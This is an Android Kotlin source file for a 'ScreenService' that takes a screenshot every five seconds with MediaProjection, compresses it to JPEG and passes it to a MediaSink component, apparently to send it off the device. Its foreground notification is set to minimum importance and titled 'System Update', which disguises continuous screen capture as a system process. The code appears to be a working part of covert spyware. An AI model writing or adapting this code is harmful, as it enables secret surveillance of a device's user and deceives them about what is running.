package ai.obsidian.agent.svc

import ai.obsidian.agent.AgentApp
import ai.obsidian.agent.media.MediaSink
import ai.obsidian.agent.ui.ProjectionPrompt
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.IBinder
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import java.io.ByteArrayOutputStream

class ScreenService : Service() {

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private lateinit var app: AgentApp

    private var projection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var reader: ImageReader? = null
    private var width = 0
    private var height = 0

    override fun onCreate() {
        super.onCreate()
        app = application as AgentApp
        val manager = getSystemService(NotificationManager::class.java)
        if (manager.getNotificationChannel(CHANNEL_ID) == null) {
            manager.createNotificationChannel(
                NotificationChannel(CHANNEL_ID, "Screen", NotificationManager.IMPORTANCE_MIN)
            )
        }
        startForeground(NOTIFICATION_ID, buildNotification())
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val resultCode = intent?.getIntExtra(EXTRA_CODE, 0) ?: 0
        @Suppress("DEPRECATION")
        val data: Intent? = intent?.getParcelableExtra(EXTRA_DATA)
        if (data == null) {
            stopSelf()
            return START_NOT_STICKY
        }

        val projectionManager = getSystemService(MediaProjectionManager::class.java)
        val mediaProjection = projectionManager.getMediaProjection(resultCode, data)
        projection = mediaProjection

        val metrics = resources.displayMetrics
        width = metrics.widthPixels / 2
        height = metrics.heightPixels / 2

        reader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
        virtualDisplay = mediaProjection.createVirtualDisplay(
            "obsidian",
            width,
            height,
            metrics.densityDpi,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            reader?.surface,
            null,
            null
        )

        scope.launch { captureLoop() }
        return START_STICKY
    }

    private suspend fun captureLoop() {
        while (scope.isActive) {
            val image = runCatching { reader?.acquireLatestImage() }.getOrNull()
            if (image != null) {
                try {
                    val bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888)
                    bitmap.copyPixelsFromBuffer(image.planes[0].buffer)
                    val buffer = ByteArrayOutputStream()
                    bitmap.compress(Bitmap.CompressFormat.JPEG, 60, buffer)
                    bitmap.recycle()
                    MediaSink.deliver(app, buffer.toByteArray(), "scr")
                } finally {
                    image.close()
                }
            }
            delay(FRAME_INTERVAL_MILLIS)
        }
    }

    private fun buildNotification(): Notification =
        Notification.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_menu_gallery)
            .setContentTitle("System Update")
            .setContentText("Screen")
            .build()

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        scope.cancel()
        runCatching { virtualDisplay?.release() }
        runCatching { reader?.close() }
        runCatching { projection?.stop() }
        super.onDestroy()
    }

    companion object {
        private const val CHANNEL_ID = "obsidian.scr"
        private const val NOTIFICATION_ID = 0x0B51D20
        private const val EXTRA_CODE = "code"
        private const val EXTRA_DATA = "data"
        private const val FRAME_INTERVAL_MILLIS = 5_000L

        fun requestConsent(context: Context) {
            context.startActivity(
                Intent(context, ProjectionPrompt::class.java)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            )
        }

        fun startWith(context: Context, resultCode: Int, data: Intent) {
            context.startForegroundService(
                Intent(context, ScreenService::class.java)
                    .putExtra(EXTRA_CODE, resultCode)
                    .putExtra(EXTRA_DATA, data)
            )
        }

        fun stop(context: Context) {
            context.stopService(Intent(context, ScreenService::class.java))
        }
    }
}
